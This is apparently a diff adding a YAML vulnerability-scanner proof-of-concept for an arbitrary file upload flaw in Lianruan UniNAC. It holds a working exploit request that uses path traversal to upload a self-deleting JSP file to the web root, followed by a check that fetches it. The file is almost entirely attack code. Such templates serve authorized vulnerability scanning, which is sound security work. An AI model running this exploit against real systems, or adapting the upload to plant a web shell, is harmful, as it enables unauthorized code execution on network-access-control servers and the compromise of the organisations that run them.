@@ -1,0 +1,35 @@
+name: poc-yaml-lianruan-uninac-fileupload
+binding: 24602589-7c5f-406f-9368-2ede12132a42
+manual: true
+detail:
+    author: Aurora
+    links:
+        - https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/%E8%81%94%E8%BD%AF%E7%A7%91%E6%8A%80/%E8%81%94%E8%BD%AF%E5%87%86%E5%85%A5%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/
+    vulnerability:
+        id: CT-474109
+        level: high
+    extra:
+        keyword: app="联软科技-UniNAC"
+    warning: 该脚本会上传文件产生一个临时的无害文件，同时能够执行自删除逻辑，但是可能删除不成功
+transport: http
+set:
+    rBoundary: randomLowercase(15)
+    rFilename: randomLowercase(10)
+    rContent: md5(randomLowercase(20))
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /uai/download/uploadfileToPath.htm
+            headers:
+                Content-Type: multipart/form-data; boundary={{rBoundary}}
+            body: "--{{rBoundary}}\r\nContent-Disposition: form-data; name=\"input_localfile\"; filename=\"{{rFilename}}.jsp\"\r\nContent-Type: text/plain\r\n\r\n<%out.print(\"{{rContent}}\");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n--{{rBoundary}}\r\nContent-Disposition: form-data; name=\"uploadpath\";\r\n\r\n../webapps/notifymsg/devreport/\r\n--{{rBoundary}}--\r\n"
+        expression: response.status == 200 && response.body_string.contains("文件上传成功") && response.headers["Set-Cookie"].contains("Path=/uai")
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /notifymsg/devreport/{{rFilename}}.jsp
+        expression: response.status == 200 && response.body.bcontains(bytes(rContent))
+expression: r0() && r1()
